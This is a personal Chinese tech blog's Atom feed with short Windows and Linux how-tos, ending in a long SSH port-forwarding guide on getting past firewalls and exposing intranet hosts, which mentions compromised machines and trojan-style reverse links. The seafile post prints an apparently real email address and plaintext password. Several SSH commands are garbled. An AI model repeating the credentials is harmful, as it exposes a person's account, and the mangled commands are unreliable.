<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My Note</title>
  
  <subtitle>Posts</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dongbing.me/"/>
  <updated>2019-04-16T04:26:32.568Z</updated>
  <id>http://dongbing.me/</id>
  
  <author>
    <name>Dong Bing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>改造Powershell</title>
    <link href="http://dongbing.me/2019/04/16/Windows/%E6%94%B9%E9%80%A0Powershell/"/>
    <id>http://dongbing.me/2019/04/16/Windows/改造Powershell/</id>
    <published>2019-04-16T04:26:32.568Z</published>
    <updated>2019-04-16T04:26:32.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="改造Powershell"><a href="#改造Powershell" class="headerlink" title="改造Powershell"></a>改造Powershell</h1><h2 id="改进-PowerShell-的字体"><a href="#改进-PowerShell-的字体" class="headerlink" title="改进 PowerShell 的字体"></a>改进 PowerShell 的字体</h2><p>下载解压安装更纱黑体之后，我们重新启动一个 PowerShell 终端，就可以在菜单栏右键，选择「属性-字体」，并在字体中选择更纱黑体。适合终端使用的等宽字体是「等距更纱黑体 T SC」或「Sarasa Mono T SC」。</p><h2 id="更换-PowerShell-的配色"><a href="#更换-PowerShell-的配色" class="headerlink" title="更换 PowerShell 的配色"></a>更换 PowerShell 的配色</h2><p>微软官方提供了一个更换 PowerShell 配色的小工具：ColorTool.exe，我们可以利用它来更换 PowerShell 的主题颜色。ColorTool 支持 iTerm 主题（以 .itermcolors 结尾的主题文件）。</p><p>如果使用 Scoop，也可以这样安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install colortool</span><br></pre></td></tr></table></figure><p>ColorTool 使用非常简单。工具自带了几种主题，可以利用下面这个命令进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">colortool -s</span><br></pre></td></tr></table></figure><p>比如希望将主题配色更换为 OneHalfDark.itermcolors，只需要输入下面这个命令就可以更换并预览更新：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">colortool OneHalfDark</span><br></pre></td></tr></table></figure></p><h2 id="Oh-my-posh"><a href="#Oh-my-posh" class="headerlink" title="Oh my posh"></a>Oh my posh</h2><p>安装chocolatey<br><a href="https://chocolatey.org/install" target="_blank" rel="noopener">https://chocolatey.org/install</a></p><p>安装ConEmu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install ConEmu</span><br></pre></td></tr></table></figure></p><p>安装Oh my posh<br><a href="https://github.com/JanDeDobbeleer/oh-my-posh" target="_blank" rel="noopener">https://github.com/JanDeDobbeleer/oh-my-posh</a></p><h2 id="Fluent-Terminal"><a href="#Fluent-Terminal" class="headerlink" title="Fluent Terminal"></a>Fluent Terminal</h2><p>Fluent Terminal 在 GitHub 上面开源，项目地址在：felixse/FluentTerminal。</p><p>需要从 其 GitHub Release 页面 下载安装它。通常情况下，如果你的 Windows 版本较新，可以直接使用 No Dependencies 的那个版本，不过如果接下来你安装过程出现问题，那么就使用第一个安装包。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;改造Powershell&quot;&gt;&lt;a href=&quot;#改造Powershell&quot; class=&quot;headerlink&quot; title=&quot;改造Powershell&quot;&gt;&lt;/a&gt;改造Powershell&lt;/h1&gt;&lt;h2 id=&quot;改进-PowerShell-的字体&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows 文字转语音</title>
    <link href="http://dongbing.me/2019/04/12/Windows/Windows%20%E6%96%87%E5%AD%97%E8%BD%AC%E8%AF%AD%E9%9F%B3/"/>
    <id>http://dongbing.me/2019/04/12/Windows/Windows 文字转语音/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-16T04:26:32.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-文字转语音"><a href="#Windows-文字转语音" class="headerlink" title="Windows 文字转语音"></a>Windows 文字转语音</h1><p>新建一个vbs脚本，内容如下：<br><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">"SAPI.SpVoice"</span>).Speak<span class="string">"hello world!"</span></span><br></pre></td></tr></table></figure></p><p>其中“hello world!”为语音内容。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Windows-文字转语音&quot;&gt;&lt;a href=&quot;#Windows-文字转语音&quot; class=&quot;headerlink&quot; title=&quot;Windows 文字转语音&quot;&gt;&lt;/a&gt;Windows 文字转语音&lt;/h1&gt;&lt;p&gt;新建一个vbs脚本，内容如下：&lt;br&gt;&lt;figure
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux下自建Anki服务器</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Linux%E4%B8%8B%E8%87%AA%E5%BB%BAAnki%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Linux下自建Anki服务器/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下自建Anki服务器"><a href="#Linux下自建Anki服务器" class="headerlink" title="Linux下自建Anki服务器"></a>Linux下自建Anki服务器</h1><h2 id="1-Anki服务器端配置"><a href="#1-Anki服务器端配置" class="headerlink" title="1. Anki服务器端配置"></a>1. Anki服务器端配置</h2><p>首先安装ankiserver的服务器套件，用easy_install安装就好了，自动处理依赖关系。<strong>不要用pip</strong>，不知道为什么，会有莫名其妙的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ easy_install Ankiserver</span><br></pre></td></tr></table></figure></p><p>在自己的用户目录下创建一个目录Anki<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir Anki</span><br></pre></td></tr></table></figure></p><p>进入这个目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd Anki</span><br></pre></td></tr></table></figure></p><p>复制一个example.ini到当前目录，修改为production.ini。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/examples/example.ini .</span><br></pre></td></tr></table></figure></p><p>编辑production.ini，修改基本参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host = 192.168.0.100  #服务器的地址</span><br><span class="line">allowed_hosts = 192.168.0.30,192.168.0.40 #允许同步的客户端ip地址，你也可以写0.0.0.0 允许任何ip地址连接</span><br></pre></td></tr></table></figure></p><p>添加用户名和密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ankiserver.py addser anki #添加一个anki用户，而后输入密码</span><br></pre></td></tr></table></figure></p><p>测试运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ankiserver.py debug</span><br></pre></td></tr></table></figure></p><h2 id="2-Anki桌面版设定"><a href="#2-Anki桌面版设定" class="headerlink" title="2. Anki桌面版设定"></a>2. Anki桌面版设定</h2><p>工具——插件——打开插件文件夹。新建一个文件，命名为mysyncserver.py。<br>文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import anki.sync</span><br><span class="line">anki.sync.SYNC_BASE = &apos;http://192.168.0.100:27701/&apos;</span><br><span class="line">anki.sync.SYNC_MEDIA_BASE = &apos;http://192.168.0.100:27701/msync/&apos;</span><br></pre></td></tr></table></figure></p><p>IP地址自行修改为服务器IP</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux下自建Anki服务器&quot;&gt;&lt;a href=&quot;#Linux下自建Anki服务器&quot; class=&quot;headerlink&quot; title=&quot;Linux下自建Anki服务器&quot;&gt;&lt;/a&gt;Linux下自建Anki服务器&lt;/h1&gt;&lt;h2 id=&quot;1-Anki服务器端配置&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hexo搭建Blog</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Hexo%E6%90%AD%E5%BB%BABlog/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Hexo搭建Blog/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.210Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo搭建Blog"><a href="#Hexo搭建Blog" class="headerlink" title="Hexo搭建Blog"></a>Hexo搭建Blog</h1><h2 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h2><p>Hexo安装前需要确保有: <strong>Node.js</strong> <strong>Git</strong><br>去Node.js<a href="https://nodejs.org/download/" target="_blank" rel="noopener">官网</a>下载源码。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p><p>可以使用<code>node -v</code>检查是否安装成功。</p><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p>Node.js安装完成后即可安装Hexo<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p><h2 id="Hexo初始化"><a href="#Hexo初始化" class="headerlink" title="Hexo初始化"></a>Hexo初始化</h2><p>Hexo安装完成后初始化本地文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;blog_folder&gt;</span><br><span class="line">cd &lt;blog_folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></p><p>完成后进入修改_config.yml文件，具体<a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">配置</a>可以去Hexo官网查询。<br>Hexo主题可以从<a href="https://hexo.io/themes/" target="_blank" rel="noopener">官网</a>下载，解压后复制到themes文件夹，配置中修改即可。</p><h2 id="使用Hexo新建博客文章"><a href="#使用Hexo新建博客文章" class="headerlink" title="使用Hexo新建博客文章"></a>使用Hexo新建博客文章</h2><ol><li><p>新建文章</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br></pre></td></tr></table></figure><p>新建博客文章，相应的markdown文件在source/_posts文件夹中，修改即可。</p></li><li><p>生成网站</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>生成静态网站，整站在public文件夹下面。</p></li><li><p>网站预览</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -p 80</span><br></pre></td></tr></table></figure><p>可以预览生成的静态网站。</p></li></ol><h2 id="博客中插入图片"><a href="#博客中插入图片" class="headerlink" title="博客中插入图片"></a>博客中插入图片</h2><ol><li><p>编辑_config.yml<br>其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>这样hexo会在每次使用<code>hexo new title</code>命令时在文章源文件目录下创建同名文件夹来存储资源。</p></li><li><p>在markdown文章里引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125;</span><br><span class="line">&#123;% asset_img slug [title] %&#125;</span><br><span class="line">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure><p>例如:<br>本篇文章名叫what-is-LDAP，创建它时，会创建同名文件夹，把LDAP.png放在那个文件夹下。引用时写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img LDAP.png DLAP organization %&#125;</span><br></pre></td></tr></table></figure><p>asset_img 表示要引用图片，LDAP.png是标题，后面的是图片显示的标题。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo搭建Blog&quot;&gt;&lt;a href=&quot;#Hexo搭建Blog&quot; class=&quot;headerlink&quot; title=&quot;Hexo搭建Blog&quot;&gt;&lt;/a&gt;Hexo搭建Blog&lt;/h1&gt;&lt;h2 id=&quot;安装前准备&quot;&gt;&lt;a href=&quot;#安装前准备&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux启动seafile客户端</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Linux%E5%90%AF%E5%8A%A8seafile%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Linux启动seafile客户端/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.222Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux启动seafile客户端"><a href="#Linux启动seafile客户端" class="headerlink" title="Linux启动seafile客户端"></a>Linux启动seafile客户端</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seaf-cli sync -l a48f81b1-aa9f-4c7a-87c7-a8b1e4b74537 -s http://202.120.47.1:8000 -d /data/seafile/kuaipan -u dongbing900218@163.com -p dong71643612</span><br><span class="line">seaf-cli sync -l b7e61aea-39cc-4b5a-a3d6-32d017714e4d -s http://202.120.47.1:8000 -d /data/seafile/Pictures -u dongbing900218@163.com -p dong71643612</span><br><span class="line">seaf-cli start</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux启动seafile客户端&quot;&gt;&lt;a href=&quot;#Linux启动seafile客户端&quot; class=&quot;headerlink&quot; title=&quot;Linux启动seafile客户端&quot;&gt;&lt;/a&gt;Linux启动seafile客户端&lt;/h1&gt;&lt;figure class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux制作GIF图片</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Linux%E5%88%B6%E4%BD%9CGIF%E5%9B%BE%E7%89%87/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Linux制作GIF图片/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux制作GIF图片"><a href="#Linux制作GIF图片" class="headerlink" title="Linux制作GIF图片"></a>Linux制作GIF图片</h1><h2 id="从JPG图片序列创建GIF动图"><a href="#从JPG图片序列创建GIF动图" class="headerlink" title="从JPG图片序列创建GIF动图"></a>从JPG图片序列创建GIF动图</h2><p>先将所有 JPG 图片放到同一文件夹，再在终端中执行如下命令即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -delay 120 -loop 0 *.jpg linux.gif</span><br></pre></td></tr></table></figure></p><p>优化图片大小：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert linux.gif -fuzz 30% -layers Optimize output.gif</span><br></pre></td></tr></table></figure></p><p>附：批量裁剪图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image, ImageDraw, ImageFont</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">files = os.listdir(&quot;.&quot;)</span><br><span class="line"></span><br><span class="line">t = 0</span><br><span class="line">reg = (420,1,867,720)</span><br><span class="line"></span><br><span class="line">for f in files:</span><br><span class="line">    if &quot;jpg&quot; in f:</span><br><span class="line">        print(f)</span><br><span class="line">        im = Image.open(f)</span><br><span class="line">        im_size = im.size</span><br><span class="line">        region = im.crop(reg)</span><br><span class="line">        draw = ImageDraw.Draw(region)</span><br><span class="line">        ttfront = ImageFont.truetype(&quot;wqy-microhei.ttc&quot;,30)</span><br><span class="line">        t_str = &quot;%.3E&quot; % t</span><br><span class="line">        draw.text((25,633),&quot;t=&quot;+t_str+&quot;s&quot;,fill=(0,0,0),font=ttfront)</span><br><span class="line">        region.save(&quot;./crop/&quot;+f)</span><br><span class="line">        t += 0.000015</span><br></pre></td></tr></table></figure><p><a href="_v_attachments/20181220003953026_30521/crop.py">crop.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux制作GIF图片&quot;&gt;&lt;a href=&quot;#Linux制作GIF图片&quot; class=&quot;headerlink&quot; title=&quot;Linux制作GIF图片&quot;&gt;&lt;/a&gt;Linux制作GIF图片&lt;/h1&gt;&lt;h2 id=&quot;从JPG图片序列创建GIF动图&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nextcloud 扫描文件解决没有权限的问题</title>
    <link href="http://dongbing.me/2019/04/12/Linux/Nextcloud%20%E6%89%AB%E6%8F%8F%E6%96%87%E4%BB%B6%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://dongbing.me/2019/04/12/Linux/Nextcloud 扫描文件解决没有权限的问题/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nextcloud-扫描文件解决没有权限的问题"><a href="#Nextcloud-扫描文件解决没有权限的问题" class="headerlink" title="Nextcloud 扫描文件解决没有权限的问题"></a>Nextcloud 扫描文件解决没有权限的问题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/nextcloud</span><br><span class="line">sudo -u www-data php occ files:scan --all</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nextcloud-扫描文件解决没有权限的问题&quot;&gt;&lt;a href=&quot;#Nextcloud-扫描文件解决没有权限的问题&quot; class=&quot;headerlink&quot; title=&quot;Nextcloud 扫描文件解决没有权限的问题&quot;&gt;&lt;/a&gt;Nextcloud 扫描文件解决没
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSH端口转发情景模拟</title>
    <link href="http://dongbing.me/2019/04/12/Linux/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%83%85%E6%99%AF%E6%A8%A1%E6%8B%9F/"/>
    <id>http://dongbing.me/2019/04/12/Linux/SSH端口转发情景模拟/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.246Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSH端口转发情景模拟"><a href="#SSH端口转发情景模拟" class="headerlink" title="SSH端口转发情景模拟"></a>SSH端口转发情景模拟</h1><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。这一过程有时也被叫做“隧道”（Tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，那么也能够通过将 TCP 端口转发来使用 SSH 进行通讯。</p><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>SSH端口转发能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。</p><h2 id="2-功能"><a href="#2-功能" class="headerlink" title="2. 功能"></a>2. 功能</h2><ul><li>加密SSH Client端至SSH Server端之间的通讯数据。</li><li>突破防火墙的限制完成一些之前无法建立的TCP连接。</li></ul><h2 id="3-方式"><a href="#3-方式" class="headerlink" title="3. 方式"></a>3. 方式</h2><p>共有四种方式，分别为本地转发，远程转发，动态转发，X协议转发</p><h3 id="3-1-本地端口转发"><a href="#3-1-本地端口转发" class="headerlink" title="3.1 本地端口转发"></a>3.1 本地端口转发</h3><p>SSH连接和应用的连接这两个连接的方向一致</p><p>ssh -L [&lt;localhost&gt;:] &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSHhostname&gt;，Localhost参数可省略，默认为0.0.0.0，但为了安全性考虑务必使用127.0.0.1作为本地监听端口。</p><p>将本地机(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发是在localhost上监听一个端口，所有访问这个端口的数据都会通过ssh 隧道传输到远端的对应端口。</p><p>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost: ssh -L 7001:localhost:7070 sisca@216.194.70.6</span><br></pre></td></tr></table></figure></p><p>小结：本地端口转发的时候，本地的ssh在监听7001端口。</p><h3 id="3-2-远程端口转发"><a href="#3-2-远程端口转发" class="headerlink" title="3.2 远程端口转发"></a>3.2 远程端口转发</h3><p>SSH连接和应用的连接这两个连接的方向相反</p><p>ssh -R [&lt;localhost&gt;:]&lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt;<br> &lt;SSHhostname&gt;，Localhost参数可省略，默认为0.0.0.0，为了安全性务必使用127.0.0.1作为本地监听端口。</p><p>将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口；远程端口转发是在远程主机上监听一个端口，所有访问远程服务器的指定端口的数据都会通过ssh隧道传输到本地的对应端口。</p><p>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost: ssh -R 7001:localhost:7070 sisca@216.194.70.6</span><br></pre></td></tr></table></figure></p><p>小结：使用远程端口转发时，本地主机的端口监听并没有发生变化，相反远程主机却开始监听我们指定的7001端口。</p><h3 id="3-3-动态端口转发"><a href="#3-3-动态端口转发" class="headerlink" title="3.3 动态端口转发"></a>3.3 动态端口转发</h3><p>把远端ssh服务器当作了一个安全的代理服务器</p><p>ssh -D [&lt;localhost&gt;:]&lt;local port&gt; &lt;SSHhostname&gt;，Localhost参数可省略，默认为0.0.0.0，为了安全性务必使用127.0.0.1作为本地监听端口。</p><p>建立一个动态的SOCKS4/5的代理通道，紧接着的是本地监听的端口号；动态端口转发是建立一个ssh加密的SOCKS4/5代理通道，任何支持SOCKS4/5协议的程序都可以使用这个加密的通道来进行代理访问，现在这种方法最常用的地方就是翻墙。</p><p>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost: ssh -D 7070 sisca@216.194.70.6</span><br></pre></td></tr></table></figure></p><p>小结：使用动态端口转发时，本地主机的ssh进程在监听指定的7070端口。</p><h2 id="4-场景模拟"><a href="#4-场景模拟" class="headerlink" title="4. 场景模拟"></a>4. 场景模拟</h2><ul><li>场景一:将本机的80端口转发到174.139.9.66的8080端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh  -C –f –g –N –L 80:174.139.9.66:8080master@174.139.9.66</span><br></pre></td></tr></table></figure></li></ul><p>接着会提示输入master的密码，或使用-pw参数完成</p><ul><li>场景二：一次同时映射多个端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8888: www.host.com:80 -L 110:www.host.com:110 -L    25:www.host.com:25 user@host</span><br></pre></td></tr></table></figure></li></ul><p>同时把服务器（ <a href="http://www.host.com）的80，110，25端口映射到本机的8888，110和25端口" target="_blank" rel="noopener">www.host.com）的80，110，25端口映射到本机的8888，110和25端口</a></p><ul><li>场景三：A内网主机能放问公网的123.123.123.123的22端口，但是不能访问公网234.234.234.234的21端口，但是这两台公网主机能互访。</li></ul><p>A主机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg –L 2121:234.234.234.234:21 –pw abc123 user@123.123.123.123</span><br><span class="line">``` </span><br><span class="line">然后A主机：ftp://localhost:2121</span><br><span class="line"></span><br><span class="line">前提是获取123.123.123.123的22端口账号口令（普通和root口令均可以，区别是转发的端口问题）</span><br><span class="line"></span><br><span class="line">* 场景四：A内网主机能放问公网的123.123.123.123的22端口，但是公网B主机123.123.123.123不能访问内网的A主机。</span><br><span class="line"></span><br><span class="line">A主机：</span><br></pre></td></tr></table></figure></p><p>ssh -CNfg –R 2222:127.0.0.1:22 –pw abc123 <a href="mailto:user@123.123.123.123" target="_blank" rel="noopener">user@123.123.123.123</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B主机：</span><br></pre></td></tr></table></figure></p><p>ssh 127.0.0.1 –p 2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提是B主机开放22端口，账号口令（自建ssh服务器，或用肉鸡），灰鸽子木马用的也是反向链接，Destination (LAN_ip) &lt;- |NAT| &lt;- Source (home_ip)</span><br><span class="line"></span><br><span class="line">* 场景五：A内网主机只能访问公网的123.123.123.123，但是A如果想访问公网的很多资源。</span><br><span class="line"></span><br><span class="line">A主机：</span><br></pre></td></tr></table></figure></p><p>ssh -CNf –D 1080 –pw abc123 <a href="mailto:user@123.123.123.123" target="_blank" rel="noopener">user@123.123.123.123</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A主机浏览器socks 5 proxy设置为localhost:8888，所有之前无法访问的网站现在都可以访问。</span><br><span class="line"></span><br><span class="line">* 场景六：A内网主机开了http、ftp、vnc（5901）、sshd、socks5（1080）、cvs（2401）等服务，无合法ip 地址；外网主机B（123.123.123.123），开了sshd 服务，有合法 ip ；我们的目的是让 internet 上的任何主机能访问A上的各种服务。</span><br><span class="line"></span><br><span class="line">B主机：</span><br><span class="line">sshd服务端做点小小的设置：`vi /etc/ssh/sshd.config`加入`GatewayPorts yes`，然后重启sshd服务：`/etc/init.d/ssh restart`或 `/etc/init.d/sshd restart`或使用-g参数</span><br><span class="line"></span><br><span class="line">A主机：</span><br></pre></td></tr></table></figure></p><p>ssh -CNf –R21:127.0.0.1:21 –pw abc123 <a href="mailto:user@123.123.123.123" target="_blank" rel="noopener">user@123.123.123.123</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">公网其它主机：ftp://123.123.123.123:21</span><br><span class="line"></span><br><span class="line">* 场景七：A内网主机开了http、ftp、vnc（5901）、sshd、socks5（1080）、cvs（2401）等服务，无合法ip 地址；外网主机 B(123.123.123.123) 开了sshd 服务，有合法ip；我们的目的是让 internet 上的任何主机能访问 A 上的各种服务。</span><br><span class="line"></span><br><span class="line">A主机：</span><br></pre></td></tr></table></figure></p><p>ssh -CN –R1234:127.0.0.1:80 –pw abc123 <a href="mailto:user@123.123.123.123" target="_blank" rel="noopener">user@123.123.123.123</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B主机：</span><br></pre></td></tr></table></figure></p><p>socattcp-listen:80,reuseaddr,fork tcp:localhost:1234<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">公网其它主机： http://123.123.123.123:80 ，此时就是访问内网主机的80端口</span><br><span class="line"></span><br><span class="line">* **场景八：ssh代理**</span><br><span class="line">远程主机执行：</span><br></pre></td></tr></table></figure></p><p>ssh -CfNg -D 127.0.0.1:7000 -p port username@hostname<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
